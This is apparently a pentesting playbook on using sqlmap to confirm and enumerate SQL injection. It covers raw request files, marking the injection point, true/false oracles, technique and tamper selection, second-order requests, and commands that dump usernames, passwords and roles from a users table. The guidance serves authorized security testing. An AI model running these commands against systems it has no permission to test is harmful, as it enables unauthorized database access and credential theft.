# sqlmap Verification

Use sqlmap only to recheck known suspicious parameters or accelerate enumeration. Keep the final conclusion grounded in a minimal manual request pair.

## Prepare The Request

Use a raw request file to preserve cookies, CSRF values, content type, and body:

```bash
sqlmap -r request.txt -p username --batch --level=2 --risk=1
```

In complex bodies, mark the injection point with `*` to avoid scanning the wrong field:

```text
username=admin&password=abc*&csrf=...
```

Without a request file, still mark the exact point:

```bash
sqlmap -u "http://target/item?id=1*" --batch
sqlmap -u "http://target/search" --data "q=abc*&csrf=..." --cookie "sid=..." --batch
sqlmap -u "http://target/api" --method POST --headers "Content-Type: application/json" --data '{"name":"abc*"}' --batch
```

## Bind The Oracle

Pass the observed stable signal to sqlmap:

```bash
sqlmap -r request.txt -p q --batch --string="true marker"
sqlmap -r request.txt -p q --batch --not-string="false marker"
sqlmap -r request.txt -p id --batch --code=200
```

For time-based blind injection, tune `--time-sec`, `--timeout`, and `--retries`; do not conclude from one delayed request.

For CSRF, signatures, dynamic timestamps, or nonces, use `--csrf-token`, `--csrf-url`, `--eval`, or recapture the request. Do not interpret a negative result from an expired token.

## Narrow The Scope

```bash
sqlmap -r request.txt -p id --batch --dbms=mysql --technique=BU
sqlmap -r request.txt -p sort --batch --technique=B --prefix=")" --suffix="-- -"
sqlmap -r request.txt -p q --batch --tamper=space2comment
```

- Use `--dbms` only when fingerprinting already supports it.
- Choose `--technique` from the oracle: `B` boolean, `U` UNION, `E` error, `S` stacked, `T` time, `Q` inline query.
- Use `--tamper` only for a proven filter point; do not stack several tampers blindly.
- Use `--prefix/--suffix` only after the closure is known.
- Use `--param-del`, `--skip`, and `-p` to avoid testing the wrong duplicate parameter or array field.
- If cached state pollutes results, use `--flush-session` or a new marker and rerun the smallest scope.

## Second-Order And Sessions

For second-order triggers, provide the second request or URL so sqlmap can see the result page:

```bash
sqlmap -r store-request.txt --second-url "http://target/profile" --batch
sqlmap -r store-request.txt --second-req trigger-request.txt --batch
```

When a session expires, recapture the request. Do not let sqlmap run on a stale session and report a false negative.

## Minimal Enumeration

Extract only the data needed to advance:

```bash
sqlmap -r request.txt -p id --batch --current-db
sqlmap -r request.txt -p id --batch -D app --tables
sqlmap -r request.txt -p id --batch -D app -T users --columns
sqlmap -r request.txt -p id --batch -D app -T users -C username,password,role --dump
```

After sqlmap finds an issue, reproduce the minimal evidence with manual true/false or UNION requests. Do not report only the sqlmap banner.
